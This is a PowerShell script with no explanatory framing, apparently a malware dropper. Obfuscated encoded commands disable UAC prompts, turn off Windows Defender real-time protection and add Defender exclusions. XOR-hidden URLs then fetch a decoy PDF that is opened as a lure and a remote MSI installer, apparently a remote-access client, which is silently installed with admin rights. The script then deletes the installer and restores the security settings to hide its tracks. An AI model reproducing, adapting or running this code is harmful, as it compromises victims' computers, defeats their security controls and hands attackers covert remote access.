$ErrorActionPreference   = "SilentlyContinue"
$WarningPreference       = "SilentlyContinue"
$VerbosePreference       = "SilentlyContinue"
$ProgressPreference      = "SilentlyContinue"

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand JABwAD0AIgBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAiADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEMAbwBuAHMAZQBuAHQAUAByAG8AbQBwAHQAQgBlAGgAYQB2AGkAbwByAEEAZABtAGkAbgAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAAMAA7AFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHAAIAAtAE4AYQBtAGUAIABQAHIAbwBtAHAAdABPAG4AUwBlAGMAdQByAGUARABlAHMAawB0AG8AcAAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAAMAA7AHQAcgB5AHsAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEAIAAtAGUAYQAgADAAfQBjAGEAdABjAGgAewB9ADsAdAByAHkAewBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABlAG4AdgA6AFQARQBNAFAAIAAtAGUAYQAgADAAfQBjAGEAdABjAGgAewB9ADsAdAByAHkAewBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAKAAkAGUAbgB2ADoAUAByAG8AZwByAGEAbQBGAGkAbABlAHMAKwAiAFwAUwBjAHIAZQBlAG4AQwBvAG4AbgBlAGMAdAAgAEMAbABpAGUAbgB0ACoAIgApACAALQBlAGEAIAAwAH0AYwBhAHQAYwBoAHsAfQA7AHQAcgB5AHsAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUAByAG8AYwBlAHMAcwAgACIAbQBzAGkAZQB4AGUAYwAuAGUAeABlACIAIAAtAGUAYQAgADAAfQBjAGEAdABjAGgAewB9ADsA'

function Force-FileDelete {
    param(
        [string]$Path
    )

    if ([System.IO.File]::Exists($Path)) {
        try {
            [System.IO.File]::Delete($Path)
        } catch {
            $dir  = [System.IO.Path]::GetDirectoryName($Path)
            $name = [System.IO.Path]::GetFileNameWithoutExtension($Path)
            $ext  = [System.IO.Path]::GetExtension($Path)

            $counter = 1
            do {
                $newPath = [System.IO.Path]::Combine($dir, "$name($counter)$ext")
                $counter++
            } while ([System.IO.File]::Exists($newPath))

            try {
                [System.IO.File]::Move($Path, $newPath)
            } catch {
                
            }
        }
    } else {
       
    }
}

function CODE_SEG {
     param(
        [Parameter(Mandatory)][string] $Name, 
        [Parameter(Mandatory)][string] $PdfURL,
        [Parameter(Mandatory)][string] $InstallerURL 
    )
    
  [Net.ServicePointManager]::SecurityProtocol = `
    [Net.SecurityProtocolType]::Ssl3  -bor `
    [Net.SecurityProtocolType]::Tls   -bor `
    [Net.SecurityProtocolType]::Tls11 -bor `
    [Net.SecurityProtocolType]::Tls12 -bor `
    [Net.SecurityProtocolType]::Tls13

    Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@

    $ConsoleWin = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($ConsoleWin, 0)

    $CurrentDir = (Get-Location).Path
    $InkPath = Join-Path $CurrentDir ($Name + ".lnk")
    $PdfPath = Join-Path $CurrentDir ($Name + ".pdf")

    Write-Host "Ink Path: $InkPath"
    Write-Host "PDF Path: $PdfPath"

    Force-FileDelete -Path $InkPath
    Force-FileDelete -Path $PdfPath

    Invoke-WebRequest -Uri $PdfURL -OutFile $PdfPath -UseBasicParsing -ErrorAction SilentlyContinue
    Start-Process $PdfPath -ErrorAction SilentlyContinue

    $InstallerURI = [System.Uri] $InstallerURL
    $InstallerExt = [System.IO.Path]::GetExtension($InstallerURI.AbsolutePath)
    $RandomFileName = [System.IO.Path]::GetRandomFileName()
    $RandomFileName = [System.IO.Path]::ChangeExtension($RandomFileName, $InstallerExt)
    $InstallerPath = [System.IO.Path]::Combine($env:TEMP, $RandomFileName)
    $InstallerLogPath = [System.IO.Path]::ChangeExtension($InstallerPath, "log")

    Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath -UseBasicParsing -ErrorAction SilentlyContinue
    Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue
    
    $Arguments = "/i `"$InstallerPath`" /qn /norestart /l `"$InstallerLogPath`""
    $Process = Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Verb RunAs -Wait -PassThru

    Write-Host " Exit code: $($Process.ExitCode)"

    try {
        [System.IO.File]::Delete($InstallerPath)
    } catch {
        
    }

    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -EncodedCommand JABwAD0AIgBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAiADsAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcAAgAC0ATgBhAG0AZQAgAEMAbwBuAHMAZQBuAHQAUAByAG8AbQBwAHQAQgBlAGgAYQB2AGkAbwByAEEAZABtAGkAbgAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAANQA7AFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHAAIAAtAE4AYQBtAGUAIABQAHIAbwBtAHAAdABPAG4AUwBlAGMAdQByAGUARABlAHMAawB0AG8AcAAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0AVgBhAGwAdQBlACAAMQA7AHQAcgB5AHsAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADAAIAAtAGUAYQAgADAAfQBjAGEAdABjAGgAewB9ADsAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAnAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsAIAB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwA7ACAAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABTAGgAZQBsAGwAIAB7ACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAcwBoAGUAbABsADMAMgAuAGQAbABsACIAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAdgBvAGkAZAAgAFMASABDAGgAYQBuAGcAZQBOAG8AdABpAGYAeQAoAGkAbgB0ACAAdwBFAHYAZQBuAHQASQBkACwAdQBpAG4AdAAgAHUARgBsAGEAZwBzACwASQBuAHQAUAB0AHIAIABkAHcASQB0AGUAbQAxACwASQBuAHQAUAB0AHIAIABkAHcASQB0AGUAbQAyACkAOwAgAH0AJwA7AFsAUwBoAGUAbABsAF0AOgA6AFMASABDAGgAYQBuAGcAZQBOAG8AdABpAGYAeQAoADAAeAAwADgAMAAwADAAMAAwADAALAAwAHgAMAAwADAANQAsAFsASQBuAHQAUAB0AHIAXQA6ADoAWgBlAHIAbwAsAFsASQBuAHQAUAB0AHIAXQA6ADoAWgBlAHIAbwApADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBNAGkAbABsAGkAcwBlAGMAbwBuAGQAcwAgADgAMAAwADsAWwBTAGgAZQBsAGwAXQA6ADoAUwBIAEMAaABhAG4AZwBlAE4AbwB0AGkAZgB5ACgAMAB4ADAAOAAwADAAMAAwADAAMAAsADAAeAAwADAAMAA1ACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACkAOwA='
    
}

$ClientName     = $($k9568=60;$b=[byte[]](0x4B,0x55,0x4E,0x59,0x63,0x5F,0x53,0x52,0x5A,0x55,0x4E,0x51,0x5D,0x48,0x55,0x53,0x52,0x6C,0x78,0x7A);-join($b|%{[char]($_ -bxor$k9568)}))
$DocumentURL    = $($k8926='s2H2w17lY9';$b=[byte[]](0x1B,0x46,0x3C,0x42,0x04,0x0B,0x18,0x43,0x2B,0x58,0x04,0x1C,0x2F,0x5B,0x03,0x59,0x42,0x0E,0x2C,0x4A,0x16,0x40,0x2B,0x5D,0x19,0x45,0x52,0x02,0x2D,0x17,0x10,0x5D,0x25,0x1D,0x04,0x45,0x58,0x0F,0x32,0x55,0x16,0x4B,0x79,0x00,0x58,0x46,0x5E,0x1E,0x3C,0x14,0x17,0x5D,0x2B,0x41,0x58,0x5C,0x56,0x05,0x37,0x16,0x04,0x5B,0x3A,0x57,0x28,0x52,0x58,0x02,0x3F,0x50,0x01,0x5F,0x29,0x46,0x1E,0x5E,0x59,0x42,0x29,0x5D,0x15);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8926);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
$ClientURL      = $($k2102='bUaKIkod5xchMY';$b=[byte[]](0x0A,0x21,0x15,0x3B,0x73,0x44,0x40,0x13,0x42,0x0F,0x4D,0x0C,0x2C,0x2A,0x0A,0x37,0x0E,0x2A,0x3B,0x0F,0x00,0x0A,0x45,0x19,0x13,0x0D,0x3F,0x2A,0x07,0x36,0x4F,0x3F,0x26,0x1B,0x40,0x26,0x5C,0x16,0x4C,0x3B,0x2E,0x2B,0x07,0x30,0x0F,0x08,0x26,0x05,0x01,0x01,0x56,0x0C,0x4D,0x2B,0x21,0x30,0x07,0x3B,0x15,0x18,0x2C,0x1F,0x1A,0x14,0x1B,0x15,0x10,0x01,0x72,0x3C,0x5F,0x14,0x02,0x28,0x2C,0x18,0x1C,0x42,0x4C,0x45,0x24,0x1D,0x28,0x2A,0x16);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2102);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))


CODE_SEG -Name $ClientName -PdfURL $DocumentURL -InstallerURL $ClientURL
